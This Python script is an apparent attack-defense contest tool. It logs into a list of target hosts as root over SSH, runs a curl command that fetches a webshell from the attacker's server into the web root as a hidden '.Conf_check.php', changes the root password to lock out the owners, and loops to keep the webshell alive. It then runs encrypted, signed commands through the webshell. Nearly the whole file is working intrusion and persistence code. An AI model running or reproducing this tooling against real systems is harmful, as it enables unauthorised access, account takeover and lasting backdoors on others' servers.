#!/usr/bin/python
# -*- coding: UTF-8 -*-
# made by 3s_NwGeek
# from multiprocessing.dummy import Pool as ThreadPool
passwd = 'ts@hack'
import requests,random,time
import paramiko,base64
import time
from gevent import monkey
from gevent.pool import Pool
from bs4 import BeautifulSoup
from urllib import unquote
from hashlib import md5
monkey.patch_all()
#

# 目标主机
# target = '127.0.0.1:80'
download_path='http://192.168.205.121/mixV2.drt'#自己服务器上的webshell地址
webroot_path='/var/www/html'#上传网站根目录
RCE_code='curl -o %s %s/.Conf_check.php'%(download_path,webroot_path)#要执行的命令，反向下载马
#批量目标主机
targets=open("C:\Users\\3s_NwGeek\Desktop\\target.txt").read().splitlines()#批量目标
username='root'
oldpwd='zxzx123123'
newpwd='SKIWNksunK'
bakup_webshell_url='''http://TARGET_IP/index.php
http://TARGET_IP/light.php'''.splitlines()

def main(target):
    # 上传功能
    while True:
        usual_get(target)
        webshell_url=upupup(target)
        #读取url  php -loadip 、reupload、get ?_、norespond、random get
        # print webshell_url
        if 'http' not in webshell_url:
            time.sleep(3)
            # print "主循环一次"
            continue

        #upupup要返回上马地址

        tar,res=maintain_webshell(webshell_url,target)
        if len(res)>0:
            random_get(target,res)
        else:
            # print len(res),res
            pass
        time.sleep(5)
        # print "主循环一次"

def upupup(target):#上传
    try:
        # print "进入upupup()"
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # 跳过了远程连接中选择‘是’的环节,
        ssh.connect(hostname=target, port=22, username=username, password=oldpwd, timeout=5)
        stdin, stdout, stderr = ssh.exec_command(RCE_code+'\n')
        time.sleep(0.5)
        stdin, stdout, stderr = ssh.exec_command('passwd\n')
        time.sleep(0.5)
        stdin.write(newpwd+'\n')
        time.sleep(0.5)
        stdin.write(newpwd+'\n')
        stdin.flush()
        target_file_url='http://'+target+'/.Conf_check.php?_'
        if 'check_url' in requests.get(target_file_url + "?_").content:
            # print "跳出upupup:check_url"
            return target_file_url
        else:
            return ''

    except Exception as e:
        return ''



def maintain_webshell(webshell_url, target, Timeout=5):#检测函数，返回检测目标，检测结果
    # print "进入maintain_webshell()"
    webshell_url = webshell_url.replace('TARGET_IP', target)
    head = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0'}
    try:
        r=requests.get(webshell_url + '?_', headers=head,timeout=15,proxies={'http': 'http://127.0.0.1:8080'})
        # print r.content
        # html=BeautifulSoup(r.content.decode('gb2312','ignore'),'lxml')#注意根据实际情况编码
        html = BeautifulSoup(r.content, 'lxml', from_encoding="utf8")  # 注意根据实际情况编码
        checks_arr = html.find_all(attrs={'id': 'check_url'})#获取url
        if len(checks_arr)<2:#爬取失败重传马
            print target,"%s 获取phpurl：%d 状态码 %d webshell失效，正在尝试重传webshell\n" % (webshell_url,len(checks_arr),r.status_code)
            time.sleep(0.5)
            webshell_url, check_res=maintain_webshell(upupup(target), target)#感觉有问题，导致res数量变化
            # usual_get(target)
        else:
            check_res = []
            for check_str in checks_arr:
                check_res.append(check_str.string)

        print "权限维持成功:",target,len(check_res),webshell_url
        # print "跳出maintain_webshell():find_allphp"
        return webshell_url, check_res
    except Exception as e:
        if 'timeout' in str(e):
            RCE_res=excmd(webshell_url, passwd, 'echo testRCE')
            if RCE_res:
                print target,'：执行命令成功，但感染超时，请使用轻便版--------->',RCE_res
                return webshell_url,bakup_webshell_url
            else:
                print target+'：执行命令失败，可能权限不足感染失败，或者php遍历函数被禁，or 主机连接失败'
        print target,'err from maintain_webshell',e
        # print "跳出maintain_webshell():err"
        return webshell_url,[]

def random_get(target,res):
    try:
        # print "进入random_get"
        buff=res
        while len(res)>1:
            ran_url=random.sample(buff,1)[0]
            ran_url, res = maintain_webshell(ran_url, target)
            if len(res)<2:#失效情况下
                random.shuffle(buff)
                for url in buff:
                    url, res = maintain_webshell(url, target)
                    if len(res)>2:
                        buff=res
                        break
                    print target,'该webshell失效，正在尝试缓存buff'
            elif len(res)>=2:#成功情况下
                buff=list(set(buff+res))
                # print buff
                print len(buff)
                time.sleep(3)
            else:
                print "random_get又给我出现什么bug了，res：",res,"buff:",buff


        usual_get(target)
        # print "跳出random_get()"# print '权限维持成功：', len(res),r, res
    except Exception as e:
        print '%s   "err from random_get"：上传webshell_url错误！:%s'%(target,e)
        pass

def usual_get(target):
    try:
        # print "进入usual_get()"
        base_url='http://'+target+'/.Conf_check.php'
        w_url,res=maintain_webshell(base_url,target)
        if len(res)>1:
            # print res
            random_get(target,res)
        # print "跳出usual_get()"
    except:
        pass
################以下为命令执行函数
def getSerTime(url):
    ser_time_format = '%a, %d %b %Y %H:%M:%S GMT'
    head = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0'}
    r = requests.get(url, allow_redirects=False,headers=head,proxies={'http': 'http://127.0.0.1:8080'})
    if r.headers['Date']:
        stimestrp = time.strptime(r.headers['Date'], ser_time_format)
        stime = time.mktime(stimestrp) + 60 * 60 * 8    # GMT + 8 时区
        timeskew = int(time.time()) - int(stime)
        return timeskew
    else:
        return None
# 加密
def encrypt(string, salt, encoding='utf-8'):
    estring = ''
    b64string = base64.b64encode(string.encode(encoding)).decode('utf-8')
    for n, char in enumerate(b64string):
        estring += chr(ord(char) ^ n % salt)
    return estring
# 解密
def decrypt(estring, salt, encoding='utf-8'):
    data=estring[::-1].replace('cAFAcABAAswTA2GE2c','i').replace(':kcehc_revres','=').encode('unicode_escape').decode("string_escape")
    string=unquote(base64.urlsafe_b64decode(data))
    # string=unicode(string, "gb2312").encode("utf8")#有中文乱码去掉这个注释
    return string
# 命令执行
def excmd(url, passwd, cmd, encoding='utf-8'):
    try:
        timeskew = getSerTime('/'.join(url.split('/')[:-1]))
        # 校对服务器时间，防止时间差造成API校验失败
        nowtime = int(time.time())
        if timeskew == None:
            print('检查服务器时间出错，请手动确认服务器时间！')
            # 手动获取服务器时间戳，并保存到servtime变量中，int类型
            # Linux下获取方法： date +%s
            # Windows的话，还是运行Python, time.time()吧，放弃治疗
            servtime = time.time()
            nowtime = servtime
        else:
            nowtime -= timeskew
        # 开始发起请求
        passwd = md5(passwd.encode('utf-8')).hexdigest()
        salt = int(random.random() * 100)
        ecmd = encrypt(cmd, salt)
        sign_tmp = ecmd + passwd + str(nowtime) + str(salt)
        sign = md5(sign_tmp.encode('utf-8')).hexdigest()
        parameters = {
            'time': nowtime,
            'check': ecmd,
            'salt': salt,
            'sign': sign
        }
        head = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
                'Connection': 'close',
                'Upgrade-Insecure-Requests': '1',
                'Cache-Control': 'max-age=0'}
        r = requests.get(url, params=parameters, headers=head,proxies={'http': 'http://127.0.0.1:8080'},timeout=3)
        # r = requests.post(url, data=parameters, headers=head, proxies={'http': 'http://127.0.0.1:8080'}),
        if '0:' in r.text:print '执行成功：',
        res = decrypt(r.content.decode('utf-8').replace('0:',''), salt, encoding)
        return res
    except Exception as e:
        pass
        print(url,'参数配置错误，连接异常err:%s'%str(e))
        # traceback.print_exc()


if __name__ == '__main__':

    # main(target)
    pool = Pool(len(targets))#批量
    pool.map(main, targets)
  